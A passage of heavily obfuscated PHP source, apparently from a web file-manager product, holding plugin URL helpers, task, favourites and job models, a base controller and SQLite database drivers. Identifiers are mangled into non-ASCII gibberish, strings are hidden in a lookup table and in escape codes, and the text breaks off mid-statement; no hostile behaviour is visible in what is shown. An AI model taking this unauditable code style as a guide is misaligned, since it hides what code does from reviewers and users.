$_SERVER[ĞÂ¤àÓï]; if (!defined($ùŸÏ÷š¶[475])) { return !1; } if (_get($GLOBALS, $ùŸÏ÷š¶[503])) { return !0; } $Ëëø¹Ïó = $this->getConfig(); if (!$Ëëø¹Ïó[$°ã´£–ı]) { return !1; } return ActionCall($ùŸÏ÷š¶[1593], $Ëëø¹Ïó[$°ã´£–ı]); } public function url($…•úÇ’³, $ø …‘È = '', $–àòŒší = true) { $üöó§Àï =& $_SERVER[ĞÂ¤àÓï]; $Îü  ªœ = $this->getConfig(); $•Ö¢Õã = KOD_VERSION . $üöó§Àï[10] . KOD_VERSION_BUILD; $Àáì¯¯® = $this->packageVersion(); $¾§ Ä€ = $•Ö¢Õã . $üöó§Àï[386] . $Àáì¯¯®; if (substr($…•úÇ’³, 0, 4) == $üöó§Àï[148] || substr($…•úÇ’³, 0, 2) == $üöó§Àï[1377]) { $€­Ñ¸¦à = $…•úÇ’³ . $üöó§Àï[1594] . $¾§ Ä€; } else { if ($ø …‘È == $üöó§Àï[12]) { $€­Ñ¸¦à = $this->pluginHost . $…•úÇ’³ . $üöó§Àï[1594] . $¾§ Ä€; } else { if ($ø …‘È === $üöó§Àï[75]) { $€­Ñ¸¦à = $this->pluginHost . $…•úÇ’³; } else { if ($ø …‘È == $üöó§Àï[1595]) { $€­Ñ¸¦à = STATIC_PATH . $…•úÇ’³ . $üöó§Àï[1594] . $•Ö¢Õã; } else { if ($ø …‘È == $üöó§Àï[1596]) { $€­Ñ¸¦à = APP_HOST . $üöó§Àï[1597] . $…•úÇ’³ . $üöó§Àï[1594] . $•Ö¢Õã; } else { if (isset($Îü  ªœ[$ø …‘È])) { $€­Ñ¸¦à = $Îü  ªœ[$ø …‘È] . $…•úÇ’³ . $üöó§Àï[1594] . $¾§ Ä€; } } } } } } if (!$–àòŒší) { return $€­Ñ¸¦à; } echo $€­Ñ¸¦à; } public function link($¢æë¦‚” = false, $®”±ïù¥ = '') { $ç†¦½õª =& $_SERVER[ĞÂ¤àÓï]; if (!$¢æë¦‚”) { $this->link($ç†¦½õª[1598], $ç†¦½õª[1596]); $this->link($ç†¦½õª[1599], $ç†¦½õª[1595]); $this->link($ç†¦½õª[1600], $ç†¦½õª[1595]); $this->link($ç†¦½õª[1601], $ç†¦½õª[1595]); $this->link($ç†¦½õª[1602], $ç†¦½õª[1595]); return; } $–™áÅ§Á = $this->url($¢æë¦‚”, $®”±ïù¥, !1); if (substr($¢æë¦‚”, -3) == $ç†¦½õª[1603]) { echo $ç†¦½õª[1604] . $–™áÅ§Á . $ç†¦½õª[1605] . $ç†¦½õª[231]; } else { if (substr($¢æë¦‚”, -4) == $ç†¦½õª[1606]) { echo $ç†¦½õª[1607] . $–™áÅ§Á . $ç†¦½õª[1608] . $ç†¦½õª[231]; } } } } goto c©“ÁÕ»; BÍ­ˆ–¤: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\164\141\163\x6b\114\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x74\171\x70\145", "\145\166\x65\x6e\164", "\164\151\x6d\145", "\144\x65\x73\x63", "\x73\x79\163\164\x65\x6d", "\x65\x6e\x61\x62\x6c\145", "\154\141\163\164\122\165\x6e", "\163\x6f\162\x74"); public function listData($ÚâŞµúã = false, $¤Ñì¿‚  = "\163\x6f\x72\x74", $çÍÚÁòî = false) { return parent::listData($ÚâŞµúã, $¤Ñì¿‚ , $çÍÚÁòî); } public function add($œÜ´¯ÛŒ) { $Ç¯Î™ƒğ =& $_SERVER[ĞÂ¤àÓï]; $¦å»ï” = $this->findByName($œÜ´¯ÛŒ[$Ç¯Î™ƒğ[32]]); if ($¦å»ï”) { return !1; } $œÜ´¯ÛŒ[$Ç¯Î™ƒğ[1624]] = 0; $œÜ´¯ÛŒ[$Ç¯Î™ƒğ[1878]] = $this->getSort(); return parent::insert($œÜ´¯ÛŒ); } private function getSort() { $´›Ÿæˆó =& $_SERVER[ĞÂ¤àÓï]; $Ç†ñ·Üí = parent::listData(); $·¶ó¥ëó = array_to_keyvalue($Ç†ñ·Üí, $´›Ÿæˆó[12], $´›Ÿæˆó[1878]); return empty($·¶ó¥ëó) ? 0 : max($·¶ó¥ëó) + 1; } public function update($ó¶Îç¿„, $ùˆèé¤Û) { $æÇ½Èñ¯ =& $_SERVER[ĞÂ¤àÓï]; $ËºÇÊå = $this->listData($ó¶Îç¿„); $¤ß†«Æ = $this->findByName($ùˆèé¤Û[$æÇ½Èñ¯[32]]); if (!$ËºÇÊå || $¤ß†«Æ && $¤ß†«Æ[$æÇ½Èñ¯[399]] != $ËºÇÊå[$æÇ½Èñ¯[399]]) { return !1; } return parent::update($ó¶Îç¿„, $ùˆèé¤Û); } public function remove($å¼óƒûÊ, $ñÕÏãĞì = false) { $Ô­…‹‡ =& $_SERVER[ĞÂ¤àÓï]; $Ö¬Ã×Ùê = $this->listData($å¼óƒûÊ); if (!$Ö¬Ã×Ùê) { return; } if (!$ñÕÏãĞì && $Ö¬Ã×Ùê[$Ô­…‹‡[1285]] == $Ô­…‹‡[88]) { return !1; } return parent::remove($å¼óƒûÊ); } public function enable($šêöïŠ›, $ÍÅÖˆª) { return $this->update($šêöïŠ›, array($_SERVER[ĞÂ¤àÓï][2281] => $ÍÅÖˆª)); } public function run($ôŸ°ò¼ë) { return $this->update($ôŸ°ò¼ë, array($_SERVER[ĞÂ¤àÓï][2293] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($‘¨†™‘·) { $Àœåôê =& $_SERVER[ĞÂ¤àÓï]; return array($Àœåôê[1965] => array(USER_ID, $Àœåôê[2294])); } protected function listData() { $÷¬çœĞ¯ =& $_SERVER[ĞÂ¤àÓï]; $îˆ¾Ÿ´  = array($÷¬çœĞ¯[1655] => USER_ID, $÷¬çœĞ¯[484] => 0); $ôõå¸¥š = $÷¬çœĞ¯[2295]; $èĞÔËêé = $this->field($ôõå¸¥š)->where($îˆ¾Ÿ´ )->order($÷¬çœĞ¯[2296])->select(); return $èĞÔËêé ? $èĞÔËêé : array(); } protected function resetCache() { } protected function listView() { $Òâ‹Ì =& $_SERVER[ĞÂ¤àÓï]; $Ú«ŸóÏ¼ = $this->listData(); $Ì£Ú¹êÛ = array_filter_by_field($Ú«ŸóÏ¼, $Òâ‹Ì[33], $Òâ‹Ì[416]); $‘åşÊ£î = array_to_keyvalue($Ì£Ú¹êÛ, $Òâ‹Ì[12], $Òâ‹Ì[84]); if (!$‘åşÊ£î) { return $Ú«ŸóÏ¼; } $Ğó´Àß = 2000; $ş¹šÚ’ç = array($Òâ‹Ì[417] => array($Òâ‹Ì[418], $‘åşÊ£î)); $²¢–ˆÂ = Model($Òâ‹Ì[832])->listSource($ş¹šÚ’ç, $Ğó´Àß); $²¢–ˆÂ = array_merge($²¢–ˆÂ[$Òâ‹Ì[83]], $²¢–ˆÂ[$Òâ‹Ì[82]]); $²¢–ˆÂ = array_to_keyvalue($²¢–ˆÂ, $Òâ‹Ì[402]); foreach ($Ú«ŸóÏ¼ as $ğíÖì‰Ç => $Õ»èõ®ü) { $äµùÈÇ‹ = $²¢–ˆÂ[$Õ»èõ®ü[$Òâ‹Ì[84]]]; $äµùÈÇ‹ = $äµùÈÇ‹ ? $äµùÈÇ‹ : array(); $Ú«ŸóÏ¼[$ğíÖì‰Ç] = array_merge($äµùÈÇ‹, $Õ»èõ®ü); } return $Ú«ŸóÏ¼; } protected function addFav($Ñå‘ØÒ«, $È˜ò£ä = '', $õˆÔ‡ÖÊ = "\163\157\165\x72\143\x65") { $•…Ì­ññ =& $_SERVER[ĞÂ¤àÓï]; $çŠ»·îÙ = array($•…Ì­ññ[1655] => USER_ID, $•…Ì­ññ[484] => 0, $•…Ì­ññ[422] => $õˆÔ‡ÖÊ, $•…Ì­ññ[421] => $Ñå‘ØÒ«); if ($this->where($çŠ»·îÙ)->find()) { return !1; } $çŠ»·îÙ = array($•…Ì­ññ[1655] => USER_ID, $•…Ì­ññ[484] => 0); $Ï†à£œ© = $this->where($çŠ»·îÙ)->max($•…Ì­ññ[1878]); if (!$Ï†à£œ©) { $Ï†à£œ© = 0; } if (!$È˜ò£ä && $õˆÔ‡ÖÊ == $•…Ì­ññ[416]) { $„Ë•±Å = Model($•…Ì­ññ[1336])->where(array($•…Ì­ññ[417] => $Ñå‘ØÒ«))->find(); if (!$„Ë•±Å) { return !1; } $È˜ò£ä = $„Ë•±Å[$•…Ì­ññ[32]]; } $È˜ò£ä = $this->getAutoName($È˜ò£ä); $òÇ‘› = array($•…Ì­ññ[1655] => USER_ID, $•…Ì­ññ[484] => 0, $•…Ì­ññ[420] => $È˜ò£ä, $•…Ì­ññ[421] => $Ñå‘ØÒ«, $•…Ì­ññ[422] => $õˆÔ‡ÖÊ, $•…Ì­ññ[1858] => $Ï†à£œ© + 1); return $this->add($òÇ‘›); } protected function remove($èÙö‰Ë¦) { $‡ƒá òá =& $_SERVER[ĞÂ¤àÓï]; $Û¨·á“Ï = array($‡ƒá òá[1655] => USER_ID, $‡ƒá òá[419] => $èÙö‰Ë¦); return $this->where($Û¨·á“Ï)->delete(); } protected function removeByName($ì¹”—×¯) { $µªİ×à =& $_SERVER[ĞÂ¤àÓï]; $¤±Ñ Ïş = array($µªİ×à[1655] => USER_ID, $µªİ×à[420] => $ì¹”—×¯, $µªİ×à[484] => 0); return $this->where($¤±Ñ Ïş)->delete(); } protected function rename($¤¹±·“â, $×™ğ¨Î) { $º©åÂÄ¬ =& $_SERVER[ĞÂ¤àÓï]; if ($¤¹±·“â == $×™ğ¨Î) { return !1; } $ôÜ›Ç± = $this->getAutoName($×™ğ¨Î); if ($×™ğ¨Î != $ôÜ›Ç±) { return !1; } $Ó“Ğ’ĞÆ = array($º©åÂÄ¬[1655] => USER_ID, $º©åÂÄ¬[484] => 0, $º©åÂÄ¬[32] => $¤¹±·“â); return $this->where($Ó“Ğ’ĞÆ)->save(array($º©åÂÄ¬[32] => $×™ğ¨Î)); } protected function resetSort($ÆŸÌÒ†ö) { $•œ¨ˆîˆ =& $_SERVER[ĞÂ¤àÓï]; $ÆŸÌÒ†ö = is_array($ÆŸÌÒ†ö) ? $ÆŸÌÒ†ö : array(); $ï˜ş¸Ëı = array($•œ¨ˆîˆ[1655] => USER_ID); for ($¤›ş÷‹Ï = 0; $¤›ş÷‹Ï < count($ÆŸÌÒ†ö); $¤›ş÷‹Ï++) { $ï˜ş¸Ëı[$•œ¨ˆîˆ[419]] = $ÆŸÌÒ†ö[$¤›ş÷‹Ï]; $this->where($ï˜ş¸Ëı)->save(array($•œ¨ˆîˆ[1858] => $¤›ş÷‹Ï + 1)); } return !0; } protected function moveTop($—Á­É¼) { $“ÇùäĞå =& $_SERVER[ĞÂ¤àÓï]; $Ø‡šİš× = array($“ÇùäĞå[1655] => USER_ID, $“ÇùäĞå[484] => 0); $‹—íƒ¢ = $this->where($Ø‡šİš×)->where(array($“ÇùäĞå[32] => $—Á­É¼))->find(); if (!$‹—íƒ¢) { return; } $È©ÁîÍ = $this->field($“ÇùäĞå[399])->where($Ø‡šİš×)->order($“ÇùäĞå[2296])->select(); $È©ÁîÍ = array_to_keyvalue($È©ÁîÍ, $“ÇùäĞå[12], $“ÇùäĞå[399]); $Éê’Ã¢Û = $È©ÁîÍ; $È©ÁîÍ = array_remove_value($È©ÁîÍ, $‹—íƒ¢[$“ÇùäĞå[399]]); array_unshift($È©ÁîÍ, $‹—íƒ¢[$“ÇùäĞå[399]]); return $this->resetSort($È©ÁîÍ); } protected function moveBottom($á¶Ø½±‚) { $Áä™ï¸« =& $_SERVER[ĞÂ¤àÓï]; $ó¤³İ„Í = array($Áä™ï¸«[1655] => USER_ID, $Áä™ï¸«[484] => 0); $ÓŞ³®ª = $this->where($ó¤³İ„Í)->max($Áä™ï¸«[1878]); $˜ë÷Ö¶İ = array($Áä™ï¸«[1878] => $ÓŞ³®ª + 1); return $this->where($ó¤³İ„Í)->where(array($Áä™ï¸«[32] => $á¶Ø½±‚))->save($˜ë÷Ö¶İ); } private function getAutoName($Ö£‡»Ú˜) { $‰º‹ûœŸ =& $_SERVER[ĞÂ¤àÓï]; $¦Ï¦‡éÓ = array($‰º‹ûœŸ[1655] => USER_ID, $‰º‹ûœŸ[484] => 0); $¯°ğ¥ Ø = $this->field($‰º‹ûœŸ[32])->where($¦Ï¦‡éÓ)->select(); $¯°ğ¥ Ø = array_to_keyvalue($¯°ğ¥ Ø, $‰º‹ûœŸ[12], $‰º‹ûœŸ[32]); if (!$¯°ğ¥ Ø || !in_array($Ö£‡»Ú˜, $¯°ğ¥ Ø)) { return $Ö£‡»Ú˜; } for ($”ªÒÌŠ = 0; $”ªÒÌŠ < count($¯°ğ¥ Ø); $”ªÒÌŠ++) { if (!in_array($Ö£‡»Ú˜ . "\50{$”ªÒÌŠ}\51", $¯°ğ¥ Ø)) { return $Ö£‡»Ú˜ . "\50{$”ªÒÌŠ}\51"; } } return $Ö£‡»Ú˜ . "\x28{$”ªÒÌŠ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\x6a\x6f\142\114\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\144\x65\163\x63", "\163\157\x72\164"); const JOB_KEY = "\163\145\x6c\146\x4a\x6f\x62\x4c\151\163\164"; public function listData($®øçê = false, $››Œ·¤ñ = "\x73\157\x72\164", $õ¢•åû = false) { return parent::listData($®øçê, $››Œ·¤ñ, $õ¢•åû); } public function remove($«Ş¶›Ş©) { return parent::remove($«Ş¶›Ş©); } public function add($õÒã‘§«) { $¥’õ¾»ì =& $_SERVER[ĞÂ¤àÓï]; if ($this->findByName($õÒã‘§«[$¥’õ¾»ì[32]])) { return !1; } $õÒã‘§«[$¥’õ¾»ì[1878]] = $this->getSort(); return parent::insert($õÒã‘§«); } private function getSort() { $Ìø˜âÇƒ =& $_SERVER[ĞÂ¤àÓï]; $ü»¹× = parent::listData(); $¿Ô–™ãÄ = array_to_keyvalue($ü»¹×, $Ìø˜âÇƒ[12], $Ìø˜âÇƒ[1878]); return empty($¿Ô–™ãÄ) ? 0 : max($¿Ô–™ãÄ) + 1; } public function update($ÇÅ³Ã…á, $Ë¥µ€é”) { $ºìú†¦ =& $_SERVER[ĞÂ¤àÓï]; $ÄÚ´üÌÁ = parent::listData($ÇÅ³Ã…á); $ÄôÜ—›Ÿ = $this->findByName($Ë¥µ€é”[$ºìú†¦[32]]); if (!$ÄÚ´üÌÁ || $ÄôÜ—›Ÿ && $ÄôÜ—›Ÿ[$ºìú†¦[399]] != $ÄÚ´üÌÁ[$ºìú†¦[399]]) { return !1; } return parent::update($ÇÅ³Ã…á, $Ë¥µ€é”); } public function setUserJob($é‡’±¶, $±ıáÖ) { $ä…©É»½ =& $_SERVER[ĞÂ¤àÓï]; if (!is_array($±ıáÖ)) { $±ıáÖ = array($±ıáÖ); } $‚Áé»± = parent::listData(); $‹’ÑÖ¤ƒ = array_to_keyvalue($‚Áé»±, $ä…©É»½[32]); $Ñï¼ÆŠ˜ = $ä…©É»½[378]; foreach ($±ıáÖ as $ìã÷¿¨›) { if ($‹’ÑÖ¤ƒ[$ìã÷¿¨›]) { $Ñï¼ÆŠ˜ .= $‹’ÑÖ¤ƒ[$ìã÷¿¨›][$ä…©É»½[399]] . $ä…©É»½[50]; } else { $Õ–ª = $this->add($ìã÷¿¨›); $Ñï¼ÆŠ˜ .= $Õ–ª . $ä…©É»½[50]; } } $Ñï¼ÆŠ˜ = rtrim($Ñï¼ÆŠ˜, $ä…©É»½[50]); Model($ä…©É»½[535])->metaSet($é‡’±¶, self::JOB_KEY, $Ñï¼ÆŠ˜); } public function getUserJob($Û’·õÆë) { $±ı™ÛŠÓ = Model($_SERVER[ĞÂ¤àÓï][535])->metaGet($Û’·õÆë); return $this->getUserJobInfo($±ı™ÛŠÓ[self::JOB_KEY]); } public function getUserJobInfo($ËÙÓÛ•) { $í§ñì×« =& $_SERVER[ĞÂ¤àÓï]; $­È»²¶ = explode($í§ñì×«[50], $ËÙÓÛ•); $½Ì¬±ø = parent::listData(); $½Ì¬±ø = array_remove_key($½Ì¬±ø, $í§ñì×«[200]); $¿©Õ“ƒ‚ = array(); foreach ($­È»²¶ as $°óêÂ) { if (isset($½Ì¬±ø[$°óêÂ])) { $¿©Õ“ƒ‚[] = $½Ì¬±ø[$°óêÂ]; } } return $¿©Õ“ƒ‚; } } goto aƒë¸‹ò©Ê; E¶µóÄå: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $±Ÿ¯î±è =& $_SERVER[ĞÂ¤àÓï]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$±Ÿ¯î±è[6]] =& $config; $this->values[$±Ÿ¯î±è[7]] =& $in; $this->tpl = TEMPLATE . MOD . $±Ÿ¯î±è[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($†ÃğÅô·) { if (1 === func_num_args()) { $this->{$†ÃğÅô·} = new $†ÃğÅô·(); } else { $×äº‰ãë = new ReflectionClass($†ÃğÅô·); $–üöîËŒ = func_get_args(); array_shift($–üöîËŒ); $this->{$†ÃğÅô·} = $×äº‰ãë->newInstanceArgs($–üöîËŒ); } return $this->{$†ÃğÅô·}; } public function routeBind($¤ÌÑ‚˜, $“›øÓöÇ, $¥­İÂÑ– = 3) { $Ğ–ú¬‹è =& $_SERVER[ĞÂ¤àÓï]; $À¨óŸ®å = $this->in[$Ğ–ú¬‹è[9]]; $¤ÌÑ‚˜ = str_replace($Ğ–ú¬‹è[10], $Ğ–ú¬‹è[11], trim(trim($¤ÌÑ‚˜, $Ğ–ú¬‹è[8]), $Ğ–ú¬‹è[12])); if (!$¤ÌÑ‚˜ || count($À¨óŸ®å) <= $¥­İÂÑ–) { return !1; } $¿ûˆçå = !0; $ÉüÈèğ = explode($Ğ–ú¬‹è[8], $¤ÌÑ‚˜); for ($ÅŸÁ®Ë— = 0; $ÅŸÁ®Ë— < count($ÉüÈèğ); $ÅŸÁ®Ë—++) { if ($ÉüÈèğ[$ÅŸÁ®Ë—] != $À¨óŸ®å[$¥­İÂÑ– + $ÅŸÁ®Ë—]) { $¿ûˆçå = !1; break; } } if (!$¿ûˆçå) { return; } call_user_func_array(array($this, $“›øÓöÇ), array()); } public function routeArgs($¨½ÇÂàÓ = 3) { $½ĞòºíÛ = $this->in[$_SERVER[ĞÂ¤àÓï][9]]; if (count($½ĞòºíÛ) <= $¨½ÇÂàÓ) { return array(); } $´ğŒò— = array(); for ($äÒãİ€å = $¨½ÇÂàÓ; $äÒãİ€å < count($½ĞòºíÛ); $äÒãİ€å += 2) { $´ğŒò—[$½ĞòºíÛ[$äÒãİ€å]] = $½ĞòºíÛ[$äÒãİ€å + 1]; $this->in[$½ĞòºíÛ[$äÒãİ€å]] = $½ĞòºíÛ[$äÒãİ€å + 1]; } return $´ğŒò—; } protected function assign($‡ÖÄœ¿õ, $ÌíÓØ×ñ) { $this->values[$‡ÖÄœ¿õ] = $ÌíÓØ×ñ; } protected function display($¢šû‚ù) { ob_end_clean(); extract($this->values); require $this->tpl . $¢šû‚ù; } } class DbSqliteBase extends Db { public function __construct($å÷ÖóË = '') { $æ¦ˆ¿Ñö =& $_SERVER[ĞÂ¤àÓï]; if (!extension_loaded($æ¦ˆ¿Ñö[13])) { think_exception(think_lang($æ¦ˆ¿Ñö[14]) . $æ¦ˆ¿Ñö[15]); } if (!empty($å÷ÖóË)) { if (!isset($å÷ÖóË[$æ¦ˆ¿Ñö[16]])) { $å÷ÖóË[$æ¦ˆ¿Ñö[16]] = 438; } $this->config = $å÷ÖóË; if (empty($this->config[$æ¦ˆ¿Ñö[17]])) { $this->config[$æ¦ˆ¿Ñö[17]] = array(); } } } public function connect($—ŞËÉö› = '', $Ú»¢…­× = 0) { $ˆë²ÌÂ‘ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($this->linkID[$Ú»¢…­×])) { if (empty($—ŞËÉö›)) { $—ŞËÉö› = $this->config; } $ˆãµúÑô = !empty($—ŞËÉö›[$ˆë²ÌÂ‘[17]][$ˆë²ÌÂ‘[18]]) ? $—ŞËÉö›[$ˆë²ÌÂ‘[17]][$ˆë²ÌÂ‘[18]] : $this->pconnect; $É©ÏÂÎ© = $ˆãµúÑô ? $ˆë²ÌÂ‘[19] : $ˆë²ÌÂ‘[20]; $this->linkID[$Ú»¢…­×] = $É©ÏÂÎ©($—ŞËÉö›[$ˆë²ÌÂ‘[21]], $—ŞËÉö›[$ˆë²ÌÂ‘[16]]); if (!$this->linkID[$Ú»¢…­×]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ú»¢…­×], 30000); if (1 != think_config($ˆë²ÌÂ‘[22])) { unset($this->config); } } return $this->linkID[$Ú»¢…­×]; } public function free() { $this->queryID = null; } public function query($ÇÇÛŞè¨) { $ûšóÅîĞ =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÇÇÛŞè¨; if ($this->queryID) { $this->free(); } think_action_status($ûšóÅîĞ[23], 1); think_status($ûšóÅîĞ[24]); $this->queryID = sqlite_query($this->_linkID, $ÇÇÛŞè¨); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÎæêÄ³¾ = $this->getAll(); return $ÎæêÄ³¾; } } public function execute($Î¦©âÉ½) { $Õ¨„ªÛ =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Î¦©âÉ½; if ($this->queryID) { $this->free(); } think_action_status($Õ¨„ªÛ[25], 1); think_status($Õ¨„ªÛ[24]); $Å¨´ïİÈ = sqlite_exec($this->_linkID, $Î¦©âÉ½); $this->debug(); if (!1 === $Å¨´ïİÈ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ĞÂ¤àÓï][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ôá±³²³ = sqlite_query($this->_linkID, $_SERVER[ĞÂ¤àÓï][27]); if (!$ôá±³²³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶ä“Ç = sqlite_query($this->_linkID, $_SERVER[ĞÂ¤àÓï][28]); if (!$¶ä“Ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $›òÃ¿Ì = array(); if ($this->numRows > 0) { for ($ğÆ¸Şé = 0; $ğÆ¸Şé < $this->numRows; $ğÆ¸Şé++) { $›òÃ¿Ì[$ğÆ¸Şé] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $›òÃ¿Ì; } public function getFields($å£§êî) { $¼ÆİÑ“³ =& $_SERVER[ĞÂ¤àÓï]; $ÑÌ“ıÛÃ = $this->query($¼ÆİÑ“³[29] . $å£§êî . $¼ÆİÑ“³[30]); $—ÒœÜ‡‰ = array(); if ($ÑÌ“ıÛÃ) { foreach ($ÑÌ“ıÛÃ as $ÅÇà×› => $Òå¢‹–) { $—ÒœÜ‡‰[$Òå¢‹–[$¼ÆİÑ“³[31]]] = array($¼ÆİÑ“³[32] => $Òå¢‹–[$¼ÆİÑ“³[31]], $¼ÆİÑ“³[33] => $Òå¢‹–[$¼ÆİÑ“³[34]], $¼ÆİÑ“³[35] => (bool) ($Òå¢‹–[$¼ÆİÑ“³[36]] === $¼ÆİÑ“³[12]), $¼ÆİÑ“³[37] => $Òå¢‹–[$¼ÆİÑ“³[38]], $¼ÆİÑ“³[39] => strtolower($Òå¢‹–[$¼ÆİÑ“³[40]]) == $¼ÆİÑ“³[41], $¼ÆİÑ“³[42] => strtolower($Òå¢‹–[$¼ÆİÑ“³[43]]) == $¼ÆİÑ“³[44]); } } return $—ÒœÜ‡‰; } public function getTables($‹ÍÄÔ¥Ö = '') { $„¶öª’‰ =& $_SERVER[ĞÂ¤àÓï]; $ªü‹ıÉÀ = $this->query($„¶öª’‰[45] . $„¶öª’‰[46] . $„¶öª’‰[47]); $æÅä®Õ = array(); foreach ($ªü‹ıÉÀ as $µ‡Ü÷ => $˜¼”öÊƒ) { $æÅä®Õ[$µ‡Ü÷] = current($˜¼”öÊƒ); } return $æÅä®Õ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $µç–¶÷Ó =& $_SERVER[ĞÂ¤àÓï]; $ø´ÍÆšÁ = sqlite_last_error($this->_linkID); $this->error = $ø´ÍÆšÁ . $µç–¶÷Ó[4] . sqlite_error_string($ø´ÍÆšÁ); if ($µç–¶÷Ó[12] != $this->queryStr) { $this->error .= LNG($µç–¶÷Ó[48]) . $this->queryStr; } think_trace($this->error, $µç–¶÷Ó[12], $µç–¶÷Ó[49]); return $this->error; } public function escapeString($ˆÅííü) { return sqlite_escape_string($ˆÅííü); } public function parseLimit($øÏÁé£‚) { $øõÒÊ =& $_SERVER[ĞÂ¤àÓï]; $«³šªê = $øõÒÊ[12]; if (!empty($øÏÁé£‚)) { $øÏÁé£‚ = explode($øõÒÊ[50], $øÏÁé£‚); if (count($øÏÁé£‚) > 1) { $«³šªê .= $øõÒÊ[51] . $øÏÁé£‚[1] . $øõÒÊ[52] . $øÏÁé£‚[0] . $øõÒÊ[53]; } else { $«³šªê .= $øõÒÊ[51] . $øÏÁé£‚[0] . $øõÒÊ[53]; } } return $«³šªê; } } class DbSqlite3Base extends Db { public function __construct($¾ì·ò² = '') { $À®ğìÕ =& $_SERVER[ĞÂ¤àÓï]; if (!class_exists($À®ğìÕ[54])) { think_exception(think_lang($À®ğìÕ[14]) . $À®ğìÕ[55]); } if (!empty($¾ì·ò²)) { if (!isset($¾ì·ò²[$À®ğìÕ[16]])) { $¾ì·ò²[$À®ğìÕ[16]] = 438; } $this->config = $¾ì·ò²; if (empty($this->config[$À®ğìÕ[17]])) { $this->config[$À®ğìÕ[17]] = array(); } } } public function connect($«Ì¬Øš  = '', $ôÁ¡Õµš = 0) { $äõÃğŞŒ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($this->linkID[$ôÁ¡Õµš])) { if (empty($«Ì¬Øš )) { $«Ì¬Øš  = $this->config; } $this->linkID[$ôÁ¡Õµš] = new SQLite3($«Ì¬Øš [$äõÃğŞŒ[21]]); if (!$this->linkID[$ôÁ¡Õµš]) { think_exception($this->linkID[$ôÁ¡Õµš]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ôÁ¡Õµš]->busyTimeout(30000); if (1 != think_config($äõÃğŞŒ[22])) { unset($this->config); } } return $this->linkID[$ôÁ¡Õµš]; } public function free() { $this->queryID = null; } public function query($‚ñÂı­) { $åóô–¡Ô =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‚ñÂı­; if ($this->queryID) { $this->free(); } think_action_status($åóô–¡Ô[23], 1); think_status($åóô–¡Ô[24]); $this->queryID = $this->_linkID->query($‚ñÂı­); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÏÂ»Å = $this->getAll(); $this->numRows = count($ÏÂ»Å); return $ÏÂ»Å; } } public function execute($¦îø) { $ãèİ©û¦ =& $_SERVER[ĞÂ¤àÓï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¦îø; if ($this->queryID) { $this->free(); } think_action_status($ãèİ©û¦[25], 1); think_status($ãèİ©û¦[24]); $Ê²ÜĞÅÕ = $this->_linkID->exec($¦îø); $this->debug(); if (!1 === $Ê²ÜĞÅÕ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ĞÂ¤àÓï][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Š±£™ãÛ = $this->_linkID->query($_SERVER[ĞÂ¤àÓï][27]); if (!$Š±£™ãÛ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¬¹²ç±ğ = $this->_linkID->query($_SERVER[ĞÂ¤àÓï][28]); if (!$¬¹²ç±ğ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $æÔŞÙŞ = array(); while ($´Éáˆ§‹ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $æÔŞÙŞ[] = $´Éáˆ§‹; } $this->queryID->reset(); return $æÔŞÙŞ; } public function getFields($Ÿ©“ª†À) { $ÆİêÜÃ =& $_SERVER[ĞÂ¤àÓï]; $½¿ô£Ú = $this->query($ÆİêÜÃ[29] . $Ÿ©“ª†À . $ÆİêÜÃ[30]); $âºŠ¤İ¢ = array(); if ($½¿ô£Ú) { foreach ($½¿ô£Ú as $ÕøÖÄÔ£ => $÷¸õ¾ªÃ) { $âºŠ¤İ¢[$÷¸õ¾ªÃ[$ÆİêÜÃ[32]]] = array($ÆİêÜÃ[32] => $÷¸õ¾ªÃ[$ÆİêÜÃ[32]], $ÆİêÜÃ[33] => $÷¸õ¾ªÃ[$ÆİêÜÃ[33]], $ÆİêÜÃ[35] => (bool) ($÷¸õ¾ªÃ[$ÆİêÜÃ[35]] === $ÆİêÜÃ[12]), $ÆİêÜÃ[37] => 